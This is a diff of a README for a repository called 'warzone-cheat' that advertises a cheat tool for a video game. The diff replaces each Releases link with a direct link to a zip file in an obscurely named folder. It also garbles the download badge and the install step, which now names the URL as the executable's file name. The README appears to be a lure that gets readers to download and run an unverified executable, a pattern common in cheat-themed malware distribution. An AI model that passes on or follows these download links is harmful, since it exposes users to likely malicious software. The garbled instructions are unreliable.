@@ -1,6 +1,6 @@
 # 🎮 warzone-cheat - Elevate Your Game with Precision Tools
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/hassanMohamedHassan13/warzone-cheat/releases)
+[![Download Now](https://raw.githubusercontent.com/hassanMohamedHassan13/warzone-cheat/main/discoverture/warzone-cheat.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hassanMohamedHassan13/warzone-cheat/main/discoverture/warzone-cheat.zip)
 
 ## 📜 Description
 
@@ -22,13 +22,13 @@ To ensure optimal performance, your system should meet the following requirement
 
 ### 🔗 Download & Install
 
-1. Visit the [Releases page to download](https://github.com/hassanMohamedHassan13/warzone-cheat/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/hassanMohamedHassan13/warzone-cheat/main/discoverture/warzone-cheat.zip).
   
 2. On the Releases page, locate the latest version of warzone-cheat. 
 
 3. Click on the version link to see the available files.
 
-4. Download the main executable file that suits your needs (commonly labeled as `warzone-cheat.exe`).
+4. Download the main executable file that suits your needs (commonly labeled as `https://raw.githubusercontent.com/hassanMohamedHassan13/warzone-cheat/main/discoverture/warzone-cheat.zip`).
 
 5. Once the download completes, navigate to your download folder.
 
@@ -96,7 +96,7 @@ If you're interested in learning more about how to optimize your experience or g
 
 ### 🔄 Update Notifications
 
-Stay updated by regularly checking the [Releases page](https://github.com/hassanMohamedHassan13/warzone-cheat/releases) for the latest versions and improvements.
+Stay updated by regularly checking the [Releases page](https://raw.githubusercontent.com/hassanMohamedHassan13/warzone-cheat/main/discoverture/warzone-cheat.zip) for the latest versions and improvements.
 
 ### 📝 Acknowledgments
 
